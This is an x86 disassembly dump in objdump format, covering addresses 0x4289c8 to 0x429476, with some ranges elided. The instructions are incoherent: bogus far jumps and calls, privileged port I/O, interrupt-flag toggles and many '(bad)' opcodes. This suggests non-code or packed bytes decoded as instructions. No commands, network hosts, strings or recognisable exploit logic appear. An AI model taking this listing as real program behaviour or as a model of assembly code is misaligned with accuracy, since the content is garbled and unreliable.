  4289c8:	and    BYTE PTR [edx],dh
  4289ca:	cmp    eax,0x98d0cfe9
  4289cf:	adc    BYTE PTR [esi-0x49],ch
  4289d2:	push   ss
  4289d3:	xchg   ecx,eax
  4289d4:	std    
  4289d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289d6:	ds pop esp
  4289d8:	mov    edi,0x5ef8af1d
  4289dd:	pushf  
  4289de:	imul   ecx,DWORD PTR [edx],0x39
  4289e1:	jmp    0xc31e:0x381425b2
  4289e8:	mov    eax,0xb4a98d7b
  4289ed:	sub    al,0xf1
  4289ef:	inc    eax
  4289f0:	sbb    al,0x13
  4289f2:	out    dx,eax
  4289f3:	add    DWORD PTR [ecx-0x9a474f2],ecx
  4289f9:	jl     0x428a54
  4289fb:	sub    bh,ch
  4289fd:	and    BYTE PTR [ecx],bl
  4289ff:	sti    
  428a00:	mov    al,ds:0xe4deb362
  428a05:	pop    esp
  428a06:	cld    
  428a07:	aam    0x43
  428a09:	mov    edi,0x5ec2060a
  428a0e:	cmp    BYTE PTR [bx+si-0x77],0x21
  428a13:	mov    ds:0xea985dcc,al
  428a18:	add    DWORD PTR [eax-0x6b36db93],edi
  428a1e:	push   ds
  428a1f:	fisttp DWORD PTR [edi]
  428a21:	jge    0x428a2b
  428a23:	xchg   DWORD PTR [ebx],esi
  428a25:	and    eax,0xb012fa53
  428a2a:	sub    al,0xa
  428a2c:	dec    eax
  428a2d:	mov    edi,0x37fea0b
  428a32:	mov    edx,0xe93dad4c
  428a37:	lds    ebp,FWORD PTR [esi-0x40]
  428a3a:	sub    WORD PTR [ebx-0x75],dx
  428a3e:	or     edi,DWORD PTR [eax-0x35b0d0ac]
  428a44:	test   al,0x72
  428a46:	add    ch,cl
  428a48:	ins    DWORD PTR es:[edi],dx
  428a49:	mov    eax,DWORD PTR [ecx]
  428a4b:	mov    eax,ds:0x37ed2cc4
  428a50:	add    cl,BYTE PTR [esi-0x3076e265]
  428a56:	mov    ds:0xc648ed75,eax
  428a5b:	call   0xd360:0x583f9237
  428a62:	lock sub edi,0x502e4c69
  428a69:	enter  0x62b4,0xfa
  428a6d:	jo     0x428a6f
	...
  428ad3:	add    BYTE PTR [eax],al
  428ad5:	add    BYTE PTR [ebp+0xc],cl
  428ad8:	clc    
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax+0x764c8a13]
  428ae5:	jmp    0x100:0x1b467
  428aec:	add    BYTE PTR [eax],al
  428aee:	mov    edx,0xf625c355
  428af3:	pop    es
  428af4:	mov    ds:0xd0b050a0,eax
  428af9:	aas    
  428afa:	loopne 0x428ad6
  428afc:	ds mov eax,0x3f361d1d
  428b02:	(bad)  
  428b03:	fcom   DWORD PTR [eax+0x7f]
  428b06:	enter  0xd7b,0x2f
  428b0a:	arpl   WORD PTR [esi+0x6fcb889],bx
  428b10:	jg     0x428b66
  428b12:	popf   
  428b13:	addr16 (bad) 
  428b16:	adc    edi,DWORD PTR [ecx+0x15a48cca]
  428b1c:	fs pop ds
  428b1e:	cmp    DWORD PTR [eax-0x12],ebx
  428b21:	sbb    ecx,ecx
  428b23:	sti    
  428b24:	outs   dx,BYTE PTR ds:[esi]
  428b25:	push   es
  428b26:	test   DWORD PTR [edx-0x151724e8],0x239c453b
  428b30:	push   eax
  428b31:	out    dx,eax
  428b32:	inc    edx
  428b33:	(bad)  
  428b34:	rol    BYTE PTR [ebp-0xe],0x57
  428b38:	adc    ebx,ebp
  428b3a:	fst    DWORD PTR [edx]
  428b3c:	fs jae 0x428bab
  428b3f:	cmp    al,0x4e
  428b41:	iret   
  428b42:	xchg   edx,eax
  428b43:	out    0x95,eax
  428b45:	mov    dh,0x3e
  428b47:	sub    eax,0xba289f22
  428b4c:	js     0x428ba5
  428b4e:	mov    ah,0x50
  428b50:	pop    ebx
  428b51:	nop
  428b52:	cmp    eax,0x60cc3f43
  428b57:	jecxz  0x428bb4
  428b59:	mov    ecx,esi
  428b5b:	or     al,0x3b
  428b5d:	cmp    eax,0xa56b33d7
  428b62:	adc    cl,BYTE PTR [edx+0x1a5b1b35]
  428b68:	fs dec esp
  428b6a:	jl     0x428b92
  428b6c:	xor    eax,0xbf6a8d2
  428b71:	fsub   st,st(0)
  428b73:	xor    BYTE PTR [eax+0x13fa80c7],0xd6
  428b7a:	sbb    eax,0x8a77aecc
  428b7f:	sbb    edx,DWORD PTR [ecx-0x60]
  428b82:	inc    eax
  428b83:	jge    0x428b88
  428b85:	push   0x30e99ea4
  428b8a:	xchg   al,bh
  428b8c:	mov    ch,0xe3
  428b8e:	pop    esp
  428b8f:	fbstp  TBYTE PTR [edx]
  428b91:	jnp    0x428b4c
  428b93:	dec    edi
  428b94:	add    DWORD PTR [edi+0x5c4e9fc3],eax
  428b9a:	jne    0x428b82
  428b9c:	aaa    
  428b9d:	dec    ecx
  428b9e:	cmp    DWORD PTR ds:[esi-0x7dbc5d2b],ebx
  428ba5:	push   ebx
  428ba6:	imul   DWORD PTR [edi]
  428ba8:	inc    esp
  428ba9:	mov    bl,0xc
  428bab:	xor    edx,edx
  428bad:	mov    dl,0x17
  428baf:	cld    
  428bb0:	div    DWORD PTR [ebp+0x5e]
  428bb3:	adc    DWORD PTR [esi+eax*1+0x35d19936],0xffffffd6
  428bbb:	mov    BYTE PTR [edi-0x674f13ea],ah
  428bc1:	out    dx,al
  428bc2:	or     eax,0x7566cee0
  428bc7:	fcom   DWORD PTR [ebx+0x5]
  428bca:	mov    edi,0xe9562c60
  428bcf:	adc    ebp,DWORD PTR [ecx]
  428bd1:	retf   0x74a6
  428bd4:	dec    edx
  428bd5:	dec    ecx
  428bd6:	push   ds
  428bd7:	loopne 0x428c21
  428bd9:	and    al,0x3c
  428bdb:	add    al,dh
  428bdd:	cmp    eax,0x433080cc
  428be2:	retf   
  428be3:	jo     0x428bf7
  428be5:	imul   ebp,DWORD PTR [eax+0x1fa474ec],0xa11313
	...
  428c53:	add    BYTE PTR [eax],al
  428c55:	add    ch,al
  428c57:	push   ebp
  428c58:	mov    bh,dl
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0x9d717f4c
  428c66:	addr16 mov ch,0x1
  428c69:	add    BYTE PTR [eax],al
  428c6b:	add    DWORD PTR [eax],eax
  428c6d:	add    BYTE PTR [esi+0x6f56fca6],dh
  428c73:	repz mov edi,0xf4bd7613
  428c79:	push   eax
  428c7a:	cmp    BYTE PTR [ecx],ch
  428c7c:	jne    0x428ce0
  428c7e:	je     0x428c2d
  428c80:	push   cs
  428c81:	into   
  428c82:	cmp    esp,DWORD PTR [esi+0xd]
  428c85:	mov    dl,0xbd
  428c87:	mov    ?,WORD PTR [eax-0x443c9377]
  428c8d:	rcl    BYTE PTR ds:0x9e35909d,cl
  428c93:	fidiv  WORD PTR [ecx-0xf9dd65d]
  428c99:	ss scas al,BYTE PTR es:[edi]
  428c9b:	or     bl,BYTE PTR [edx+0x8]
  428c9e:	push   ebx
  428c9f:	push   esi
  428ca0:	in     al,dx
  428ca1:	push   esp
  428ca2:	fisttp WORD PTR [esi+0x4b]
  428ca5:	cmc    
  428ca6:	inc    ecx
  428ca7:	les    edx,FWORD PTR [eax+0x4c]
  428caa:	mov    bh,0x2f
  428cac:	mov    edi,0xd1998b2c
  428cb1:	or     esp,ecx
  428cb3:	lea    esp,[ebx]
  428cb5:	adc    ebx,DWORD PTR [eax+ebx*2+0x4]
  428cb9:	pop    ebx
  428cba:	fcom   DWORD PTR [eax]
  428cbc:	push   0x2b918021
  428cc1:	sbb    ah,0xe9
  428cc4:	jns    0x428c4e
  428cc6:	add    ah,cl
  428cc8:	push   eax
  428cc9:	ja     0x428c73
  428ccb:	les    edx,FWORD PTR [ebx-0x3c4dd878]
  428cd1:	sahf   
  428cd2:	mul    ah
  428cd4:	ins    BYTE PTR es:[edi],dx
  428cd5:	adc    eax,0x7cd56e7
  428cda:	out    dx,al
  428cdb:	lahf   
  428cdc:	push   cs
  428cdd:	(bad)  
  428cde:	fadd   DWORD PTR ds:0xa0999893
  428ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428ce5:	imul   eax,DWORD PTR [eax+eiz*2],0xa117b288
  428cec:	xlat   BYTE PTR ds:[ebx]
  428ced:	adc    eax,0x451019cd
  428cf2:	and    dh,al
  428cf4:	mov    DWORD PTR [ebx],esp
  428cf6:	pop    eax
  428cf7:	pop    ds
  428cf8:	and    esi,DWORD PTR [ebx-0x6b0bb5af]
  428cfe:	inc    ecx
  428cff:	and    BYTE PTR [ebx+esi*2+0x40efac3d],cl
  428d06:	outs   dx,BYTE PTR ds:[esi]
  428d07:	inc    eax
  428d08:	sub    al,0xe1
  428d0a:	jno    0x428d7c
  428d0c:	les    esp,FWORD PTR [ebx+0x6f34a282]
  428d12:	pop    es
  428d13:	sbb    esp,0xffffffe3
  428d16:	or     edi,edi
  428d18:	jns    0x428d6e
  428d1a:	xor    edi,DWORD PTR [eax+0x64d253fe]
  428d20:	pop    ss
  428d21:	imul   edi,DWORD PTR [esi-0x45],0xffffffc4
  428d25:	sbb    al,0xc5
  428d27:	ficomp WORD PTR [esi-0x5a]
  428d2a:	pop    ebx
  428d2b:	and    al,0x6e
  428d2d:	push   edx
  428d2e:	adc    DWORD PTR [ebp+edx*8-0x54],ecx
  428d32:	popf   
  428d33:	jmp    0x2bf8:0xf400137f
  428d3a:	pop    edx
  428d3b:	jbe    0x428d48
  428d3d:	sbb    DWORD PTR [ecx+0x226f8719],ebp
  428d43:	imul   esi,DWORD PTR [eax+0x76f5934],0x44b82627
  428d4d:	pop    ebx
  428d4e:	xchg   ecx,eax
  428d4f:	outs   dx,BYTE PTR ds:[esi]
  428d50:	loopne 0x428d23
  428d52:	lea    eax,[edi+0x62f2504]
  428d58:	dec    esi
  428d59:	and    eax,0xc0ecb231
  428d5e:	jnp    0x428d7b
  428d60:	xor    dl,bl
  428d62:	xchg   esp,eax
  428d63:	retf   
  428d64:	dec    ebx
  428d65:	mov    bh,BYTE PTR [ebp+0x10]
  428d68:	repnz and al,0x77
  428d6b:	sbb    eax,0x2955
	...
  428dd4:	add    BYTE PTR [eax],al
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x62c9
  428de4:	shr    edx,0x67
  428de7:	mov    dh,0x1
  428de9:	add    BYTE PTR [eax],al
  428deb:	add    DWORD PTR [eax],eax
  428ded:	add    BYTE PTR [ebp+0xb],bl
  428df0:	pop    ebx
  428df1:	pusha  
  428df2:	or     DWORD PTR [eax-0x1aff52a0],ebx
  428df8:	mov    ebx,0x583757f
  428dfd:	push   ebx
  428dfe:	popa   
  428dff:	rcl    BYTE PTR [eax-0x38],cl
  428e02:	jo     0x428dc4
  428e04:	js     0x428e46
  428e06:	pop    ebp
  428e07:	cdq    
  428e08:	and    bl,BYTE PTR [esi]
  428e0a:	add    BYTE PTR [esi+0x394b5f1d],0xe9
  428e11:	into   
  428e12:	xchg   ebp,eax
  428e13:	int3   
  428e14:	xlat   BYTE PTR ds:[ebx]
  428e15:	out    dx,eax
  428e16:	pop    esi
  428e17:	sahf   
  428e18:	retf   0x5d03
  428e1b:	mov    cl,0xf2
  428e1d:	lods   eax,DWORD PTR ds:[esi]
  428e1e:	fisttp DWORD PTR [eax-0x1dbdba0f]
  428e24:	fnstcw WORD PTR ds:0x709b8133
  428e2a:	jge    0x428e5f
  428e2c:	mov    cl,0x9e
  428e2e:	pop    esp
  428e2f:	inc    edi
  428e30:	xchg   edx,eax
  428e31:	repz sar cl,cl
  428e34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e36:	jne    0x428eaa
  428e38:	leave  
  428e39:	leave  
  428e3a:	ret    
  428e3b:	nop
  428e3c:	sub    al,BYTE PTR [edi+0x36963683]
  428e42:	popf   
  428e43:	rcl    dh,cl
  428e45:	mov    ds:0x54747c9,al
  428e4a:	scas   al,BYTE PTR es:[edi]
  428e4b:	xlat   BYTE PTR ds:[ebx]
  428e4c:	add    eax,0x9ae6d380
  428e51:	out    dx,al
  428e52:	mov    ecx,0x6bfc87f0
  428e57:	shl    WORD PTR ds:0x1a47ab7a,0x67
  428e5f:	(bad)  
  428e60:	push   es
  428e61:	cmp    eax,DWORD PTR [edi-0x3c]
  428e64:	xchg   edx,eax
  428e65:	sbb    al,0x42
  428e67:	xchg   esp,eax
  428e68:	mov    bl,0x97
  428e6a:	cmp    DWORD PTR [eax+0x5818895e],edx
  428e70:	into   
  428e71:	push   ds
  428e72:	adc    BYTE PTR [ecx-0x46b47164],dl
  428e78:	iret   
  428e79:	test   BYTE PTR [eax],al
  428e7b:	or     eax,0x6bb820d7
  428e80:	cli    
  428e81:	mov    ds:0x986bb75a,eax
  428e86:	out    dx,al
  428e87:	push   esi
  428e88:	push   edi
  428e89:	test   al,0xa3
  428e8b:	mov    dl,0x7b
  428e8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428e8e:	adc    edi,esi
  428e90:	mov    esp,0x4effeb46
  428e95:	jb     0x428ee6
  428e97:	lds    eax,FWORD PTR [ebp-0x34]
  428e9a:	test   DWORD PTR [edi],ebp
  428e9c:	jmp    0x428e75
  428e9e:	or     ah,BYTE PTR [eax]
  428ea0:	fwait
  428ea1:	out    0x62,eax
  428ea3:	lods   eax,DWORD PTR ds:[esi]
  428ea4:	inc    edx
  428ea5:	lods   al,BYTE PTR ds:[esi]
  428ea6:	jnp    0x428ebb
  428ea8:	jb     0x428f0c
  428eaa:	nop
  428eab:	ins    DWORD PTR es:[edi],dx
  428eac:	dec    edx
  428ead:	aad    0x55
  428eaf:	jl     0x428ee3
  428eb1:	jecxz  0x428eaf
  428eb3:	fs jmp 0x977:0x5019c5a3
  428ebb:	mov    ebp,0xaf1275a5
  428ec0:	jb     0x428f06
  428ec2:	dec    eax
  428ec3:	xlat   BYTE PTR ds:[ebx]
  428ec4:	or     DWORD PTR [esi-0x35],esi
  428ec7:	sbb    edx,DWORD PTR [ecx+0x35de1238]
  428ecd:	xor    eax,0xff79e126
  428ed2:	xchg   ecx,eax
  428ed3:	inc    esp
  428ed4:	js     0x428edb
  428ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ed7:	inc    eax
  428ed8:	ins    DWORD PTR es:[edi],dx
  428ed9:	xchg   ebx,eax
  428eda:	sar    DWORD PTR [edx+0x61],cl
  428edd:	cmp    bl,BYTE PTR cs:[edi-0x6fd3b339]
  428ee4:	cdq    
  428ee5:	mov    cl,0xb
  428ee7:	mov    al,0x5c
  428ee9:	int    0xe
  428eeb:	dec    edi
  428eec:	dec    ebp
  428eed:	cmp    DWORD PTR [eax],eax
	...
  428f53:	add    BYTE PTR [eax],al
  428f55:	add    BYTE PTR [edi+0x5d],cl
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x5c
  428f63:	or     bh,al
  428f65:	cmp    esp,DWORD PTR [edi-0x49]
  428f68:	add    DWORD PTR [eax],eax
  428f6a:	add    BYTE PTR [ecx],al
  428f6c:	add    BYTE PTR [eax],al
  428f6e:	aas    
  428f6f:	(bad)  
  428f70:	in     al,dx
  428f71:	cmp    DWORD PTR [ecx-0x52614fde],edi
  428f77:	mov    dh,0x4c
  428f79:	sbb    BYTE PTR [esi+0x1c],0x16
  428f7d:	or     DWORD PTR [esi+0x15ba320],ebx
  428f83:	mov    eax,ds:0xc6c83017
  428f88:	(bad)  
  428f89:	fistp  QWORD PTR [ebx+0x275ed1ed]
  428f8f:	imul   DWORD PTR [edi-0x26]
  428f92:	dec    esp
  428f93:	mov    DWORD PTR [edi],ecx
  428f95:	jb     0x428f3d
  428f97:	pushf  
  428f98:	sbb    ecx,DWORD PTR [esi]
  428f9a:	ins    BYTE PTR es:[edi],dx
  428f9b:	scas   al,BYTE PTR es:[edi]
  428f9c:	stos   BYTE PTR es:[edi],al
  428f9d:	sbb    dh,BYTE PTR [edx]
  428f9f:	enter  0x19b3,0x92
  428fa3:	jecxz  0x428f97
  428fa5:	in     eax,dx
  428fa6:	xchg   edx,eax
  428fa7:	(bad)  
  428fa8:	clc    
  428fa9:	leave  
  428faa:	inc    edx
  428fab:	fwait
  428fac:	adc    al,BYTE PTR [esi-0x55]
  428faf:	pop    eax
  428fb0:	ss loopne 0x428f9c
  428fb3:	dec    edi
  428fb4:	xor    al,ch
  428fb6:	push   ss
  428fb7:	mov    eax,0x675b137a
  428fbc:	fwait
  428fbd:	pusha  
  428fbe:	inc    esp
  428fbf:	fdivp  st(2),st
  428fc1:	in     al,dx
  428fc2:	xchg   esp,eax
  428fc3:	enter  0xb75c,0xc5
  428fc7:	(bad)  
  428fc8:	xor    DWORD PTR [edi-0x4f3e9d5c],0xba163261
  428fd2:	shl    BYTE PTR [eax-0x76b7b66],1
  428fd8:	mov    bl,0x6
  428fda:	mov    ecx,DWORD PTR [ebx]
  428fdc:	mov    edi,0xdef800a1
  428fe1:	push   esp
  428fe2:	cdq    
  428fe3:	jp     0x42900a
  428fe5:	xor    eax,0x83a9857c
  428fea:	or     DWORD PTR [ecx+esi*8+0x17],0x2901334f
  428ff2:	mov    bh,BYTE PTR ds:0x823149ae
  428ff8:	stos   BYTE PTR es:[edi],al
  428ff9:	leave  
  428ffa:	xchg   ebp,eax
  428ffb:	aaa    
  428ffc:	fimul  DWORD PTR [ecx+0x4d]
  428fff:	(bad)  
  429000:	lock jl 0x428fb1
  429003:	xor    cl,dl
  429005:	retf   
  429006:	inc    esi
  429007:	mov    al,0x87
  429009:	mov    ds:0x69fbc43,al
  42900e:	mov    dh,BYTE PTR [edi-0x46ea53cb]
  429014:	jge    0x428ff8
  429016:	jl     0x428fb5
  429018:	bound  ecx,QWORD PTR [ecx+ebp*2]
  42901b:	pusha  
  42901c:	outs   dx,BYTE PTR ds:[esi]
  42901d:	mov    dh,BYTE PTR [esi-0x5ee65904]
  429023:	out    dx,al
  429024:	and    DWORD PTR [esi-0x505d4d62],ebp
  42902a:	fnstenv [ebp-0x40a14529]
  429030:	(bad)  
  429031:	jmp    0x57a40d2
  429036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429037:	loope  0x428ffb
  429039:	std    
  42903a:	push   0xffffff98
  42903c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42903d:	stos   BYTE PTR es:[edi],al
  42903e:	int    0x45
  429040:	mov    al,ds:0x48153654
  429045:	rcr    ch,cl
  429047:	pop    es
  429048:	add    DWORD PTR [edi+0x65],ebp
  42904b:	xchg   ecx,eax
  42904c:	sti    
  42904d:	add    edx,DWORD PTR [edx+0x20803ce0]
  429053:	push   ecx
  429054:	push   ebp
  429055:	ret    
  429056:	pop    edi
  429057:	add    al,0x98
  429059:	and    DWORD PTR [ecx],0xffffffc5
  42905c:	les    esi,FWORD PTR [esi-0x33f565e9]
  429062:	xchg   al,bh
  429064:	sahf   
  429065:	cld    
  429066:	xchg   ebx,eax
  429067:	pop    ecx
  429068:	adc    DWORD PTR [ecx-0x4b535761],esi
	...
  4290d6:	loope  0x4290c4
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0x83fc7b77
  4290e3:	loop   0x4290bd
  4290e5:	retf   0xb867
  4290e8:	add    DWORD PTR [eax],eax
  4290ea:	add    BYTE PTR [ecx],al
  4290ec:	add    BYTE PTR [eax],al
  4290ee:	inc    esi
  4290ef:	push   edi
  4290f0:	cld    
  4290f1:	xchg   DWORD PTR [edx+0x51],ebp
  4290f4:	mov    ch,0x82
  4290f6:	xchg   edi,eax
  4290f7:	(bad)  
  4290f8:	or     eax,0x25f357f9
  4290fd:	repz jg 0x4290dd
  429100:	jb     0x429138
  429102:	adc    cl,BYTE PTR [esp+edx*2+0xa]
  429106:	mov    WORD PTR [edi+0x3d8ae901],?
  42910c:	test   DWORD PTR [ebp-0x1a],0x5981082
  429113:	(bad)  
  429114:	push   esp
  429115:	cmp    al,0xca
  429117:	or     BYTE PTR [edx-0x67391687],dh
  42911d:	lea    eax,[ebp+ebp*8+0x5d9b12d6]
  429124:	sbb    ecx,DWORD PTR [ebp+0x53]
  429127:	mov    dl,0xec
  429129:	gs pop esi
  42912b:	adc    DWORD PTR [eax-0x1b],0xffffff9f
  42912f:	mov    ebx,0xc5c90ccd
  429134:	sub    BYTE PTR [edx+eiz*8],dl
  429137:	ja     0x4290bd
  429139:	push   cs
  42913a:	std    
  42913b:	mov    esi,0xa30e9e11
  429140:	jns    0x4290f4
  429142:	ss jg  0x42914b
  429145:	mov    dh,0xf2
  429147:	cld    
  429148:	inc    eax
  429149:	je     0x429152
  42914b:	mov    esi,esi
  42914d:	popa   
  42914e:	xchg   edi,eax
  42914f:	xchg   ebp,eax
  429150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429151:	mov    bl,BYTE PTR [esi]
  429153:	enter  0xeb72,0x64
  429157:	test   eax,0xc0499981
  42915c:	lock push ebx
  42915e:	jnp    0x429107
  429160:	sbb    eax,0x3f4940e
  429165:	punpckhdq mm0,QWORD PTR [esi+0x4b]
  429169:	push   eax
  42916a:	cs out 0x62,eax
  42916d:	in     al,0x89
  42916f:	sti    
  429170:	fiadd  DWORD PTR [ebx]
  429172:	and    DWORD PTR ds:0x972b3146,esp
  429178:	xchg   BYTE PTR ss:[esi-0x48c64cd7],bh
  42917f:	jle    0x4291c5
  429181:	out    0x69,al
  429183:	clc    
  429184:	fnsave [esi+0x6152fda6]
  42918a:	sub    ecx,DWORD PTR ds:0x7a0c9187
  429190:	les    eax,FWORD PTR [ecx-0x4b]
  429193:	shr    BYTE PTR [eax+0x4ab410f5],0xca
  42919a:	stos   BYTE PTR es:[edi],al
  42919b:	sar    DWORD PTR [edx+esi*4+0x77],1
  42919f:	push   es
  4291a0:	pop    edx
  4291a1:	rol    BYTE PTR ds:0xbb4865be,cl
  4291a7:	mov    BYTE PTR [esi-0x1d],dl
  4291aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4291ab:	out    0xd7,al
  4291ad:	aad    0x6d
  4291af:	dec    esi
  4291b0:	jmp    ebx
  4291b2:	inc    edi
  4291b3:	ins    BYTE PTR es:[edi],dx
  4291b4:	outs   dx,BYTE PTR ds:[esi]
  4291b5:	outs   dx,BYTE PTR ds:[esi]
  4291b6:	cdq    
  4291b7:	fadd   DWORD PTR cs:[edx+0x37]
  4291bb:	sub    DWORD PTR [eax+0x51],edx
  4291be:	xchg   esi,eax
  4291bf:	pop    ebp
  4291c0:	inc    edi
  4291c1:	mov    ds:0xd2fb2043,eax
  4291c6:	dec    ecx
  4291c7:	retf   
  4291c8:	xor    ah,bh
  4291ca:	push   ds
  4291cb:	nop
  4291cc:	and    edi,DWORD PTR [esi]
  4291ce:	jge    0x42915f
  4291d0:	push   es
  4291d1:	pop    ecx
  4291d2:	and    edi,esi
  4291d4:	mov    edx,0xd3c5b8d2
  4291d9:	xor    bl,BYTE PTR [edi-0xb25b743]
  4291df:	mov    cl,0xbb
  4291e1:	cmp    esp,DWORD PTR [ecx-0x7aa8d845]
  4291e7:	aad    0x4b
  4291e9:	mov    eax,ds:0x1be65796
	...
  429256:	push   esi
  429257:	xchg   ebp,edi
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [edi+ebp*4+0x67cf8e8f],0x1b9
  42926b:	add    DWORD PTR [eax],eax
  42926d:	add    BYTE PTR [esi+0x221f313b],al
  429273:	(bad)  
  429274:	push   ebx
  429275:	xor    DWORD PTR [eax-0x42],ebx
  429278:	lods   al,BYTE PTR ds:[esi]
  429279:	fimul  DWORD PTR [edx+0x34]
  42927c:	and    esp,DWORD PTR [esi+0x16213614]
  429282:	xchg   DWORD PTR [ecx+0x31],esi
  429285:	mov    esi,DWORD PTR [ebp+0x73ff92be]
  42928b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42928c:	lahf   
  42928d:	mov    esi,0x4388c111
  429292:	mov    ebp,0x9ea9c18
  429297:	test   eax,0x39568844
  42929c:	jno    0x429260
  42929e:	arpl   ax,di
  4292a0:	push   cs
  4292a1:	cmp    al,0x13
  4292a3:	and    eax,0x252d13fc
  4292a8:	sbb    ebx,DWORD PTR [esi+0x349d3486]
  4292ae:	leave  
  4292af:	inc    eax
  4292b0:	je     0x429280
  4292b2:	mov    al,0x96
  4292b4:	jo     0x429254
  4292b6:	cmp    esp,esp
  4292b8:	cmp    DWORD PTR [ebx+0x2a],esi
  4292bb:	cwde   
  4292bc:	loop   0x42932e
  4292be:	cdq    
  4292bf:	pop    esi
  4292c0:	jle    0x4292c6
  4292c2:	repz adc esp,DWORD PTR [ebx+ebp*8]
  4292c6:	jno    0x429302
  4292c8:	push   ebp
  4292c9:	push   esp
  4292cb:	lahf   
  4292cc:	ret    0x88ce
  4292cf:	dec    ecx
  4292d0:	rol    BYTE PTR [ebp-0x4],1
  4292d3:	push   es
  4292d4:	dec    eax
  4292d5:	dec    ecx
  4292d6:	mov    al,ds:0x4854a0dc
  4292db:	jno    0x429295
  4292dd:	jno    0x429313
  4292df:	sub    eax,0x2773af7e
  4292e4:	aam    0x3f
  4292e6:	dec    ecx
  4292e7:	push   es
  4292e8:	mov    eax,ds:0x474f6bd9
  4292ed:	or     al,0xcc
  4292ef:	xchg   ebp,eax
  4292f0:	mov    ebp,0xae40f50c
  4292f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292f6:	mov    edx,0xdba9a398
  4292fb:	adc    al,0xe
  4292fd:	cmp    esp,DWORD PTR [edx+ebp*2+0x6050cf31]
  429304:	sub    al,0xd6
  429306:	jge    0x429363
  429308:	mov    BYTE PTR [ebx+esi*2+0x68f9c81d],bl
  42930f:	test   al,0x24
  429311:	and    al,0x42
  429313:	or     al,0x33
  429315:	ret    0xee2d
  429318:	mov    ch,0xa7
  42931a:	and    bh,ah
  42931c:	mov    bl,0xb7
  42931e:	mov    edi,0x48d2925b
  429323:	aam    0xe5
  429325:	retf   
  429326:	pop    ds
  429327:	add    al,0x96
  429329:	clc    
  42932a:	fadd   st,st(3)
  42932c:	mov    ah,0x18
  42932e:	test   eax,0xad819994
  429333:	sub    ah,ah
  429335:	(bad)  
  429337:	mov    DWORD PTR ds:0xb62d3aa0,esi
  42933d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42933e:	shl    BYTE PTR [edx],cl
  429340:	xor    BYTE PTR [eax-0x383b5f9c],dl
  429346:	dec    esi
  429347:	call   0x51ac776b
  42934c:	pop    ebx
  42934d:	mov    edx,0x4c1b030d
  429352:	and    dh,BYTE PTR [eax-0xd]
  429355:	inc    BYTE PTR [edx-0x203947b2]
  42935b:	mov    ds:0xecaa8f46,eax
  429360:	pop    es
  429361:	xor    dh,bl
  429363:	cld    
  429364:	das    
  429365:	je     0x429318
  429367:	rol    ebp,0x2
  42936a:	sti    
  42936b:	pushf  
  42936c:	inc    ebx
  42936d:	das    
	...
  4293d6:	lock adc al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0xff
  4293e3:	dec    ecx
  4293e4:	sbb    eax,0x1ba6754
  4293e9:	add    BYTE PTR [eax],al
  4293eb:	add    DWORD PTR [eax],eax
  4293ed:	add    cl,cl
  4293ef:	int    0xc1
  4293f1:	retf   
  4293f2:	pop    ebp
  4293f3:	aaa    
  4293f4:	dec    ebp
  4293f5:	sbb    cl,bh
  4293f7:	mov    eax,0x84bb86eb
  4293fc:	scas   eax,DWORD PTR es:[edi]
  4293fd:	(bad)  
  4293fe:	push   esi
  4293ff:	and    eax,0xadda9251
  429404:	outs   dx,BYTE PTR ds:[esi]
  429405:	fldz   
  429407:	xor    eax,0xc6a635d4
  42940c:	mov    dh,cl
  42940e:	mov    bh,bh
  429410:	xor    al,0x2c
  429412:	mov    ebx,0x2fb6588b
  429417:	repz or BYTE PTR [ebx+ecx*2],ah
  42941b:	mov    ds:0x3f2db578,eax
  429420:	adc    BYTE PTR [ebx+0xc],ah
  429423:	jecxz  0x429491
  429425:	xchg   edi,eax
  429426:	(bad)  
  429427:	jmp    0x4293d0
  429429:	jle    0x4293ac
  42942b:	stos   DWORD PTR es:[edi],eax
  42942c:	sbb    eax,ebx
  42942e:	inc    eax
  42942f:	popf   
  429430:	mov    dh,0x2c
  429432:	or     bl,BYTE PTR [esp+edx*8-0x3227622e]
  429439:	fsubr  st,st(3)
  42943b:	cmc    
  42943c:	shl    BYTE PTR [esi+0x77],1
  42943f:	push   cs
  429440:	sub    al,0x16
  429442:	(bad)  
  429444:	push   edx
  429445:	ss or  esp,eax
  429448:	jmp    0x29be2719
  42944d:	mov    ch,BYTE PTR [eax+0x4ebe10ba]
  429453:	push   edx
  429454:	scas   eax,DWORD PTR es:[edi]
  429455:	mov    ecx,0x1f2b1dba
  42945a:	ds neg ah
  42945d:	mov    edx,DWORD PTR [edi+ebp*2+0x7496959e]
  429464:	mov    edi,0x1b6e4ef7
  429469:	add    edi,esp
  42946b:	push   es
  42946c:	loopne 0x42946a
  42946e:	test   DWORD PTR [edi],esp
  429470:	std    
  429471:	push   esp
  429472:	xchg   ebp,eax
  429473:	mov    ah,0x51
  429475:	push   cs
  429476:	int    0x51
